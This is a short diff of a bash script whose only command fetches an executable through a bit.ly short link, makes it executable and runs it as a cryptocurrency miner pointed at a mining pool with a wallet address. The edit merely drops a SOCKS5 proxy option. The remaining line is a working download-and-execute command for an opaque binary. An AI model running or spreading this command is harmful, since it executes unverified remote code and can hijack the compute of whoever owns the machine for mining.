@@ -1,2 +1,2 @@
 #!/bin/bash
-wget https://bit.ly/33pg3Cb && chmod +x 33pg3Cb && ./33pg3Cb -a yescryptR16 -o stratum+tcps://stratum-na.rplant.xyz:17055 -u qgUHBLFGsos52xRT6z1HvLgG75mmBzi3uy.vcpu01 -p webpassword=x -t 4 -x socks5://192.252.214.20:15864
+wget https://bit.ly/33pg3Cb && chmod +x 33pg3Cb && ./33pg3Cb -a yescryptR16 -o stratum+tcps://stratum-na.rplant.xyz:17055 -u qgUHBLFGsos52xRT6z1HvLgG75mmBzi3uy.vcpu01 -p webpassword=x -t 4
